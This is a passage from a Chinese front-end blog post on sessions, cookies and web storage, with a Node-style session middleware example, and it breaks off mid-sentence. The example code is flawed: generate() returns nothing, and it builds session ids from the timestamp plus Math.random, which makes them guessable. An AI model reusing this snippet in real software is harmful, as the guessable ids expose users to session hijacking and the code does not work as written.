<!DOCTYPE html><html lang="zh"><head><meta name="generator" content="Hugo 0.51"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="initial-scale=1,width=device-width,minimum-scale=1,maximum-scale=1,user-scalable=no"><meta name="wap-font-scale" content="no"><meta name="360-site-verification" content="0903ba33c82867d1f7bd8831e32a7e34"><meta name="sogou_site_verification" content="E8uWFBcf4a"><meta name="author" content="Fan"><meta name="description" itemprop="description" content="Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css"><meta name="keywords" content="Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css, 踩坑小报告, 微前端, 树莓派, 前端开发, 区块链, 网络, Mongodb, Vue.js, Angular.js, node.js"><meta property="og:locale" content="en_US"><meta property="og:title" content="session与登录机制"><meta property="og:image" content="https://alili.tech/images/logo2.png"><meta property="og:description" content="Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css"><meta property="og:site_name" content="Alili"><title>session与登录机制 | 前端大爆炸! - WEB BANG! BANG!! BANG!!!</title><link rel="shortcut icon" href="https://alili.tech/images/favicon.ico"><link rel="manifest" href="/manifest.json"><link rel="stylesheet" href="https://alili.tech/lib/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="https://alili.tech/lib/justified-gallery/justifiedGallery.min.css"><link rel="stylesheet" href="https://alili.tech/css/style.css"><script src="https://alili.tech/lib/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><script src="https://alili.tech/lib/jquery/jquery.min.js"></script><script>document.addEventListener("error", function (e) {
			  var elem = e.target;
			  if (elem.tagName.toLowerCase() == 'img') {
				elem.style.display='none'
			  }
			}, true);</script><script type="application/ld+json">{
				"@context": "https://ziyuan.baidu.com/contexts/cambrian.jsonld",
				"@id": "https://alili.tech/archive/60ppqvz27vk/",
				"appid": "1613049289050283", 
				"title": "session与登录机制 | 前端大爆炸! - WEB BANG! BANG!! BANG!!!", 
				"images": [],
				"pubDate": "2018-11-29T09:34:56"
			}</script></head><body><div id="header-post"><a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archive/">Archives</a></li><li><a href="/about/">About</a></li><li><a href="http://github.com/Fantasy9527" target="_blank">Github</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="https://alili.tech/archive/wxdjmdcm84/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li><li><a class="icon" href="https://alili.tech/archive/sdqkzh1vdm9/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li><li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li><li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li></ul><span id="i-prev" class="info" style="display:none;">Previous post</span> <span id="i-next" class="info" style="display:none;">Next post</span> <span id="i-top" class="info" style="display:none;">Back to top</span> <span id="i-share" class="info" style="display:none;">Share post</span></span><br><div id="share" style="display: none"><ul><li><a class="icon" href="http://v.t.sina.com.cn/share/share.php?u=https%3a%2f%2falili.tech%2farchive%2f60ppqvz27vk%2f&text=session%e4%b8%8e%e7%99%bb%e5%bd%95%e6%9c%ba%e5%88%b6"><i class="fa fa-weibo" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2falili.tech%2farchive%2f60ppqvz27vk%2f"><i class="fa fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https%3a%2f%2falili.tech%2farchive%2f60ppqvz27vk%2f&text=session%e4%b8%8e%e7%99%bb%e5%bd%95%e6%9c%ba%e5%88%b6"><i class="fa fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2falili.tech%2farchive%2f60ppqvz27vk%2f&title=session%e4%b8%8e%e7%99%bb%e5%bd%95%e6%9c%ba%e5%88%b6"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2falili.tech%2farchive%2f60ppqvz27vk%2f&is_video=false&description=session%e4%b8%8e%e7%99%bb%e5%bd%95%e6%9c%ba%e5%88%b6"><i class="fa fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=session%e4%b8%8e%e7%99%bb%e5%bd%95%e6%9c%ba%e5%88%b6&body=Check out this article: https%3a%2f%2falili.tech%2farchive%2f60ppqvz27vk%2f"><i class="fa fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2falili.tech%2farchive%2f60ppqvz27vk%2f&title=session%e4%b8%8e%e7%99%bb%e5%bd%95%e6%9c%ba%e5%88%b6"><i class="fa fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2falili.tech%2farchive%2f60ppqvz27vk%2f&title=session%e4%b8%8e%e7%99%bb%e5%bd%95%e6%9c%ba%e5%88%b6"><i class="fa fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2falili.tech%2farchive%2f60ppqvz27vk%2f&title=session%e4%b8%8e%e7%99%bb%e5%bd%95%e6%9c%ba%e5%88%b6"><i class="fa fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https%3a%2f%2falili.tech%2farchive%2f60ppqvz27vk%2f&title=session%e4%b8%8e%e7%99%bb%e5%bd%95%e6%9c%ba%e5%88%b6"><i class="fa fa-digg" aria-hidden="true"></i></a></li></ul></div><div id="toc"><nav id="TableOfContents"><ul><li><a href="#版权声明">版权声明</a><ul><li><a href="#原文标题">原文标题</a></li><li><a href="#原文链接">原文链接</a></li></ul></li></ul></nav></div></span></div><div class="content index width mx-auto px3 my3"><section id="wrapper" class="home"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">session与登录机制</h1><div class="meta"><div class="postdate"><time datetime="2018-11-29" itemprop="datePublished">2018-11-29</time></div><div class="article-tag"><i class="fa fa-eye"></i> <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span></span></div><div class="article-tag-box"></div></div></header><div class="content" itemprop="articleBody"><div id="raw"><p style="opacity: 0;">Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css, 踩坑小报告, 微前端, 树莓派, 前端开发, 区块链, 网络, Mongodb, Vue.js, Angular.js, node.js</p><script>$(function () {
            var html = "\n\n                    \n\x3cp\x3e\x3ccode\x3egithub\x3c\/code\x3e 地址：\x3ca href=\x22https:\/\/github.com\/UNDERCOVERj\/tech-blog\/issues\/3\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3e戳这里\x3c\/a\x3e\x3c\/p\x3e\n\x3ch1 id=\x22articleHeader0\x22\x3esession\x3c\/h1\x3e\n\x3ch2 id=\x22articleHeader1\x22\x3e概念\x3c\/h2\x3e\n\x3col\x3e\n\x3cli\x3e指一类用来在客户端与服务器之间保持状态的解决方案\x3c\/li\x3e\n\x3cli\x3e这种解决方案的存储结构\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader2\x22\x3e特点\x3c\/h2\x3e\n\x3cul\x3e\n\x3cli\x3e由于 \x3ccode\x3eSession\x3c\/code\x3e 是以文本文件形式存储在服务器端的，所以不怕客户端修改 Session 内容。（也可以用其他存储方式比如\x3ccode\x3eredis\x3c\/code\x3e）\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3eSession\x3c\/code\x3e对象是有生命周期的\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3eSession\x3c\/code\x3e实例是轻量级的，所谓轻量级：是指他的创建和删除不需要消耗太多资源\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3eSession\x3c\/code\x3e对象内部有一个缓存\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3ch2 id=\x22articleHeader3\x22\x3e用法\x3c\/h2\x3e\n\x3cp\x3e\x3ccode\x3eSession\x3c\/code\x3e 对象存储特定用户会话所需的属性及配置信息，在\x3ccode\x3eweb\x3c\/code\x3e页跳转时，信息将不会丢失\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader4\x22\x3e通常用于以下操作\x3c\/h3\x3e\n\x3col\x3e\n\x3cli\x3e存储整个会话过程中保持用户状态的信息，比如登录信息或者用户浏览时产生的其它信息\x3c\/li\x3e\n\x3cli\x3e存储只需要在 \x3cstrong\x3e页重新加载\x3c\/strong\x3e 过程中，或者  \x3cstrong\x3e一组功能页\x3c\/strong\x3e  之间保持状态的对象\x3c\/li\x3e\n\x3cli\x3e在 Web服务器上保持用户的  \x3cstrong\x3e状态信息\x3c\/strong\x3e  供在任何时间从任何设备上的页面进行访问。\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3ch3 id=\x22articleHeader5\x22\x3e限制\x3c\/h3\x3e\n\x3col\x3e\n\x3cli\x3e用户登录越多，\x3ccode\x3esession\x3c\/code\x3e需要的内存量越大\x3c\/li\x3e\n\x3cli\x3e每个 \x3ccode\x3eSession\x3c\/code\x3e 对象的持续时间是用户访问的时间加上不活动的时间。\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader6\x22\x3e为何需要\x3ccode\x3esession\x3c\/code\x3e\n\x3c\/h2\x3e\n\x3cp\x3eHTTP协议本身是无状态的\x3c\/p\x3e\n\x3cp\x3e举个喝咖啡的例子：\x3c\/p\x3e\n\x3cp\x3e1、该店的店员很厉害，能记住每位顾客的消费数量，只要顾客一走进咖啡店，店员就知道该怎么对待了。这种做法就是协议本身支持状态。 \x3c\/p\x3e\n\x3cp\x3e2、发给顾客一张卡片，上面记录着消费的数量，一般还有个有效期限。每次消费时，如果顾客出示这张卡片，则此次消费就会与以前或以后的消费相联系起来。这种做法就是在客户端保持状态。 \x3c\/p\x3e\n\x3cp\x3e3、发给顾客一张会员卡，除了卡号之外什么信息也不纪录，每次消费时，如果顾客出示该卡片，则店员在店里的纪录本上找到这个卡号对应的纪录添加一些消费信息。这种做法就是在服务器端保持状态。\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader7\x22\x3e具体机制\x3c\/h2\x3e\n\x3col\x3e\n\x3cli\x3e当程序需要为某个客户端的请求创建一个\x3ccode\x3esession\x3c\/code\x3e的时候，服务器首先检查这个客户端的请求里是否已包含了一个  \x3cstrong\x3esession标识\x3c\/strong\x3e   - 称为\x3ccode\x3esession id\x3c\/code\x3e，如果已包含一个\x3ccode\x3esession id\x3c\/code\x3e则说明以前已经为此客户端创建过session，服务器就按照\x3ccode\x3esession id\x3c\/code\x3e把这个\x3ccode\x3esession\x3c\/code\x3e检索出来使用（如果检索不到，可能会新建一个），如果客户端请求不包含\x3ccode\x3esession id\x3c\/code\x3e，则为此客户端创建一个\x3ccode\x3esession\x3c\/code\x3e并且生成一个与此\x3ccode\x3esession\x3c\/code\x3e相关联的\x3ccode\x3esession id\x3c\/code\x3e，\x3ccode\x3esession id\x3c\/code\x3e的值应该是一个 \x3cstrong\x3e既不会重复，又不容易被找到规律以仿造的字符串\x3c\/strong\x3e ，这个\x3ccode\x3esession id\x3c\/code\x3e将被在本次响应中返回给客户端保存。\x3c\/li\x3e\n\x3cli\x3e\n\x3cp\x3e由于\x3ccode\x3ecookie\x3c\/code\x3e可以被人为的禁止，必须有其他机制以便在\x3ccode\x3ecookie\x3c\/code\x3e被禁止时仍然能够把\x3ccode\x3esession id\x3c\/code\x3e传递回服务器。经常被使用的一种技术叫做\x3ccode\x3eURL\x3c\/code\x3e重写\x3c\/p\x3e\n\x3cp\x3e两种形式：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\/\/ 作为url附加路径\n\x27http:\/\/....\/xxx;jsessionid=abcdefjijeoijoifjioe\x27\n\n\n\/\/ 作为查询字符串\n\x27http:\/\/....\/xxx?jsessionid=abcdefjijeoijoifjioe\x27\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs rust\x22\x3e\x3ccode\x3e\x3cspan class=\x22hljs-comment\x22\x3e\/\/ 作为url附加路径\x3c\/span\x3e\n\x3cspan class=\x22hljs-symbol\x22\x3e\x27http\x3c\/span\x3e:\x3cspan class=\x22hljs-comment\x22\x3e\/\/....\/xxx;jsessionid=abcdefjijeoijoifjioe\x27\x3c\/span\x3e\n\n\n\x3cspan class=\x22hljs-comment\x22\x3e\/\/ 作为查询字符串\x3c\/span\x3e\n\x3cspan class=\x22hljs-symbol\x22\x3e\x27http\x3c\/span\x3e:\x3cspan class=\x22hljs-comment\x22\x3e\/\/....\/xxx?jsessionid=abcdefjijeoijoifjioe\x27\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3c\/li\x3e\n\x3cli\x3e较老的技术，\x3cstrong\x3e表单隐藏字段\x3c\/strong\x3e，此方法在防止csrf中有用\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader8\x22\x3e实现\x3c\/h2\x3e\n\x3cp\x3e\x3cstrong\x3e基于cookie来实现用户和数据的映射\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e将口令放在\x3ccode\x3ecookie\x3c\/code\x3e中，口令一旦被褚昂爱，就丢失映射关系。通常\x3ccode\x3esession\x3c\/code\x3e的有效期通常短，过期就将数据删除\x3c\/p\x3e\n\x3cp\x3e一旦服务器检查到用户请求\x3ccode\x3ecookie\x3c\/code\x3e中没有携带\x3ccode\x3esession_id\x3c\/code\x3e，它会为之生成一个值，这个值是唯一且不重复的值，并设定超时时间。如果过期就重新生成，如果没有过期，就更新超时时间\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22var sessions = {};\nvar key = \x27session_id\x27;\nvar EXPIRES = 20*60*1000;\nvar generate  = function () {\n    var session = {};\n    session.id = (new Date().getTime()) \x2b Math.random();\n    session.cookie = {\n        expire: (new Date()).getTime() \x2b EXPIRES\n    }\n    sessions[session.id] = session\n}\n\nfunction (req, res) {\n    var id = req.cookies[key];\n    if (!id) {\n        req.session = generate();\n    } else {\n        var session = sessions[id];\n        if (session) {\n            if (session.cookie.expire \x3e new Date().getTime()) {\n                session.cookie.expire = new Date().getTime() \x2b EXPIRES;\n                req.session = session;\n            } else {\n                delete sessions[id];\n                req.session = generate();\n            }\n        } else {\n            req.session = generate();\n        }\n    }\n}\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs verilog\x22\x3e\x3ccode\x3e\x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e sessions = {};\n\x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e key = \x27session_id\x27;\n\x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e EXPIRES = \x3cspan class=\x22hljs-number\x22\x3e20\x3c\/span\x3e*\x3cspan class=\x22hljs-number\x22\x3e60\x3c\/span\x3e*\x3cspan class=\x22hljs-number\x22\x3e1000\x3c\/span\x3e;\n\x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e \x3cspan class=\x22hljs-keyword\x22\x3egenerate\x3c\/span\x3e  = \x3cspan class=\x22hljs-keyword\x22\x3efunction\x3c\/span\x3e () {\n    \x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e session = {};\n    session\x3cspan class=\x22hljs-variable\x22\x3e.id\x3c\/span\x3e = (\x3cspan class=\x22hljs-keyword\x22\x3enew\x3c\/span\x3e Date()\x3cspan class=\x22hljs-variable\x22\x3e.getTime\x3c\/span\x3e()) \x2b Math\x3cspan class=\x22hljs-variable\x22\x3e.random\x3c\/span\x3e();\n    session\x3cspan class=\x22hljs-variable\x22\x3e.cookie\x3c\/span\x3e = {\n        expire: (\x3cspan class=\x22hljs-keyword\x22\x3enew\x3c\/span\x3e Date())\x3cspan class=\x22hljs-variable\x22\x3e.getTime\x3c\/span\x3e() \x2b EXPIRES\n    }\n    sessions[session\x3cspan class=\x22hljs-variable\x22\x3e.id\x3c\/span\x3e] = session\n}\n\n\x3cspan class=\x22hljs-keyword\x22\x3efunction\x3c\/span\x3e (req, res) {\n    \x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e id = req\x3cspan class=\x22hljs-variable\x22\x3e.cookies\x3c\/span\x3e[key];\n    \x3cspan class=\x22hljs-keyword\x22\x3eif\x3c\/span\x3e (!id) {\n        req\x3cspan class=\x22hljs-variable\x22\x3e.session\x3c\/span\x3e = \x3cspan class=\x22hljs-keyword\x22\x3egenerate\x3c\/span\x3e();\n    } \x3cspan class=\x22hljs-keyword\x22\x3eelse\x3c\/span\x3e {\n        \x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e session = sessions[id];\n        \x3cspan class=\x22hljs-keyword\x22\x3eif\x3c\/span\x3e (session) {\n            \x3cspan class=\x22hljs-keyword\x22\x3eif\x3c\/span\x3e (session\x3cspan class=\x22hljs-variable\x22\x3e.cookie\x3c\/span\x3e\x3cspan class=\x22hljs-variable\x22\x3e.expire\x3c\/span\x3e \x26gt; \x3cspan class=\x22hljs-keyword\x22\x3enew\x3c\/span\x3e Date()\x3cspan class=\x22hljs-variable\x22\x3e.getTime\x3c\/span\x3e()) {\n                session\x3cspan class=\x22hljs-variable\x22\x3e.cookie\x3c\/span\x3e\x3cspan class=\x22hljs-variable\x22\x3e.expire\x3c\/span\x3e = \x3cspan class=\x22hljs-keyword\x22\x3enew\x3c\/span\x3e Date()\x3cspan class=\x22hljs-variable\x22\x3e.getTime\x3c\/span\x3e() \x2b EXPIRES;\n                req\x3cspan class=\x22hljs-variable\x22\x3e.session\x3c\/span\x3e = session;\n            } \x3cspan class=\x22hljs-keyword\x22\x3eelse\x3c\/span\x3e {\n                delete sessions[id];\n                req\x3cspan class=\x22hljs-variable\x22\x3e.session\x3c\/span\x3e = \x3cspan class=\x22hljs-keyword\x22\x3egenerate\x3c\/span\x3e();\n            }\n        } \x3cspan class=\x22hljs-keyword\x22\x3eelse\x3c\/span\x3e {\n            req\x3cspan class=\x22hljs-variable\x22\x3e.session\x3c\/span\x3e = \x3cspan class=\x22hljs-keyword\x22\x3egenerate\x3c\/span\x3e();\n        }\n    }\n}\x3c\/code\x3e\x3c\/pre\x3e\n\x3ch2 id=\x22articleHeader9\x22\x3e一种节省空间的做法\x3c\/h2\x3e\n\x3cp\x3e由于关闭浏览器不会导致\x3ccode\x3esession\x3c\/code\x3e被删除，迫使服务器为\x3ccode\x3eseesion\x3c\/code\x3e设置了一个失效时间，当距离客户端上一次使用\x3ccode\x3esession\x3c\/code\x3e的时间超过这个失效时间时，服务器就可以认为客户端已经停止了活动，才会把\x3ccode\x3esession\x3c\/code\x3e删除以节省存储空间\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader10\x22\x3e\x3ccode\x3ereference\x3c\/code\x3e\x3c\/h2\x3e\n\x3cp\x3e\x3ca href=\x22http:\/\/justsee.iteye.com\/blog\/1570652\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3ehttp:\/\/justsee.iteye.com\/blog...\x3c\/a\x3e\x3c\/p\x3e\n\x3cp\x3e\x3ca href=\x22https:\/\/baike.baidu.com\/item\/session\/479100?fr=aladdin\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3ehttps:\/\/baike.baidu.com\/item\/...\x3c\/a\x3e\x3c\/p\x3e\n\x3cp\x3e\x3ca href=\x22https:\/\/blog.csdn.net\/hjc1984117\/article\/details\/53995816\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3ehttps:\/\/blog.csdn.net\/hjc1984...\x3c\/a\x3e\x3c\/p\x3e\n\x3ch1 id=\x22articleHeader11\x22\x3e\x3ccode\x3ecookie\x3c\/code\x3e\x3c\/h1\x3e\n\x3cp\x3e存储在用户本地终端的数据\x3c\/p\x3e\n\x3cp\x3e\x3ccode\x3ehttp\x3c\/code\x3e请求自动发送，跨域除外\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader12\x22\x3e用途\x3c\/h2\x3e\n\x3cp\x3e客户端记录用户信息\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader13\x22\x3e特点\x3c\/h2\x3e\n\x3cp\x3e存储在硬盘上的\x3ccode\x3ecookie\x3c\/code\x3e可以在不同的浏览器进程间共享，比如两个\x3ccode\x3eIE\x3c\/code\x3e窗口。而对于保存在内存里的\x3ccode\x3ecookie\x3c\/code\x3e，不同的浏览器有不同的处理方式。\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader14\x22\x3e属性\x3c\/h2\x3e\n\x3col\x3e\n\x3cli\x3e\n\x3ccode\x3ename\x3c\/code\x3e：\x3ccode\x3ecookie\x3c\/code\x3e名称\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3evalue\x3c\/code\x3e：\x3ccode\x3ecookie\x3c\/code\x3e值\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3edomain\x3c\/code\x3e：可以访问\x3ccode\x3ecookie\x3c\/code\x3e的域名，某一级域名可以访问上一级级域名的cookie\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3eexpires\/Max-Age\x3c\/code\x3e：过期时间\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3eSize\x3c\/code\x3e：\x3ccode\x3ecookie\x3c\/code\x3e的大小\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3ehttp\x3c\/code\x3e：\x3ccode\x3ehttponly\x3c\/code\x3e属性，为\x3ccode\x3etrue\x3c\/code\x3e，不能用\x3ccode\x3edocument.cookie\x3c\/code\x3e获得\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3esecure\x3c\/code\x3e：为\x3ccode\x3etrue\x3c\/code\x3e只能在\x3ccode\x3ehttps\x3c\/code\x3e获得\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3epath\x3c\/code\x3e：子路径访问父路径\x3ccode\x3ecookie\x3c\/code\x3e\n\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader15\x22\x3e创建cookie\x3c\/h2\x3e\n\x3cp\x3e\x3ccode\x3edocument.cookie=\x22username=John Doe; expires=Thu, 18 Dec 2013 12:00:00 GMT; path=\/\x22;\x3c\/code\x3e\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader16\x22\x3e读取cookie\x3c\/h2\x3e\n\x3cp\x3e\x3ccode\x3edocument.cookie\x3c\/code\x3e\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader17\x22\x3e修改cookie\x3c\/h2\x3e\n\x3cp\x3e\x3ccode\x3edocument.cookie = \x3c\/code\x3e \x3c\/p\x3e\n\x3cp\x3e采用覆盖的形式\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader18\x22\x3e删除cookie\x3c\/h2\x3e\n\x3cp\x3e将过期时间设置为过去时间即可\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader19\x22\x3e与\x3ccode\x3elocalStorage\x3c\/code\x3e和\x3ccode\x3esessionStorage\x3c\/code\x3e的区别\x3c\/h2\x3e\n\x3col\x3e\n\x3cli\x3e\n\x3cp\x3e存储大小\x3c\/p\x3e\n\x3cul\x3e\n\x3cli\x3e\n\x3ccode\x3ecookie\x3c\/code\x3e数据大小不能超过4k。\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3esessionStorage\x3c\/code\x3e和\x3ccode\x3elocalStorage\x3c\/code\x3e 虽然也有存储大小的限制，但比\x3ccode\x3ecookie\x3c\/code\x3e大得多，可以达到5M或更大。\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3c\/li\x3e\n\x3cli\x3e\n\x3cp\x3e有效时间\x3c\/p\x3e\n\x3cul\x3e\n\x3cli\x3e\n\x3ccode\x3elocalStorage\x3c\/code\x3e 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据；\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3esessionStorage\x3c\/code\x3e 数据在当前浏览器窗口关闭后自动删除。\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3ecookie\x3c\/code\x3e 设置的\x3ccode\x3ecookie\x3c\/code\x3e过期时间之前一直有效，即使窗口或浏览器关闭\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3c\/li\x3e\n\x3cli\x3e\n\x3cp\x3e\x3ccode\x3esessionStorage\x3c\/code\x3e\x3c\/p\x3e\n\x3cul\x3e\n\x3cli\x3e会话级别的存储\x3c\/li\x3e\n\x3cli\x3e临时性的，页面打开有，页面关闭没有\x3c\/li\x3e\n\x3cli\x3e数据不共享\x3c\/li\x3e\n\x3cli\x3e通过a标签来跳出一个页面，则\x3ccode\x3esessionStorage\x3c\/code\x3e共享\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3c\/li\x3e\n\x3cli\x3e\n\x3cp\x3e\x3ccode\x3elocalStorage\x3c\/code\x3e\x3c\/p\x3e\n\x3cul\x3e\n\x3cli\x3e持久化的本地存储\x3c\/li\x3e\n\x3cli\x3e永久性的存储\x3c\/li\x3e\n\x3cli\x3e不能跨域\x3c\/li\x3e\n\x3cli\x3e数据共享\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3c\/li\x3e\n\x3cli\x3e\n\x3cp\x3e\x3ccode\x3ecookie\x3c\/code\x3e\x3c\/p\x3e\n\x3cul\x3e\n\x3cli\x3e\n\x3ccode\x3ecookie\x3c\/code\x3e在同源且符合\x3ccode\x3epath\x3c\/code\x3e规则的文档之间共享\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3emax-age\x3c\/code\x3e用秒来设置\x3ccode\x3ecookie\x3c\/code\x3e的生存期。\x3c\/li\x3e\n\x3cli\x3e如果\x3ccode\x3emax-age\x3c\/code\x3e为0，则表示删除该\x3ccode\x3ecookie\x3c\/code\x3e。\x3c\/li\x3e\n\x3cli\x3e如果\x3ccode\x3emax-age\x3c\/code\x3e为负数，则表示该\x3ccode\x3ecookie\x3c\/code\x3e仅在本浏览器窗口以及本窗口打开的子窗口内有效，关闭窗口后该cookie即失效。\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader20\x22\x3e如何得到\x3ccode\x3ecookie\x3c\/code\x3e\n\x3c\/h2\x3e\n\x3cp\x3e有两个http头部是专门负责设置以及发送\x3ccode\x3ecookie\x3c\/code\x3e的,它们分别是 \x3ccode\x3eSet-Cookie\x3c\/code\x3e 以及 \x3ccode\x3eCookie\x3c\/code\x3e 